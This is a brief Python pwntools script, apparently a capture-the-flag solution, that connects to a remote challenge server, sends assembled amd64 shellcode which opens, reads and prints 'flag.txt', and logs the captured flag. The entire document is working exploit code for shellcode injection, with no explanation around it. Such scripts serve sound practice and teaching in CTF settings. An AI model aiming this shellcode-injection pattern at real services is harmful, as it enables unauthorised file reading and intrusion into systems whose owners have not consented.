from pwn import *

context.arch = 'amd64'

p = remote('0.cloud.chals.io', 34381)

sc = asm(
    shellcraft.open('flag.txt') +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 100) +
    shellcraft.exit(0)
)

p.sendafter(b"> ", sc)

flag = p.recvuntil(b"}").decode('utf-8', 'ignore')
log.success(f"Flag: {flag}")
